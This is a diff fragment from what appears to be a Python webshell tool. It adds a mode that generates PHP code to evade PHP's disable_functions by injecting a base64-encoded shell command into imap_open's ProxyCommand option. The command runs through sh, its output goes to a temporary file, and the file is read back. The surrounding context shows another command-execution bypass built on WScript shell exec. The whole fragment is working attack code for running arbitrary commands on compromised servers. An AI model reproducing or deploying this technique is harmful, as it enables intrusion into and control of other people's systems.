@@ -920,6 +920,13 @@ $exec = $wsh->exec("cmd /c ".base64_decode("%s"));
 $stdout = $exec->StdOut();
 $o = $stdout->ReadAll();
 %s""" % (base64_encode(command), print_command)
+    elif (bypass_df == 7):
+        tmpname = str(uuid4())
+        return """if (!function_exists('imap_open')) {print("no imap_open function!");}
+else{$server = "x -oProxyCommand=echo\\t" . base64_encode(base64_decode("%s") . ">/tmp/%s") . "|base64\\t-d|sh}";
+imap_open('{' . $server . ':143/imap}INBOX', '', '');
+$o=file_get_contents("/tmp/%s");
+%s}""" % (base64_encode(command), tmpname, tmpname, print_command)
     elif (gget("webshell.exec_func", "webshell")):
         return SYSTEM_TEMPLATE % (base64_encode(command)) + print_command
     else:
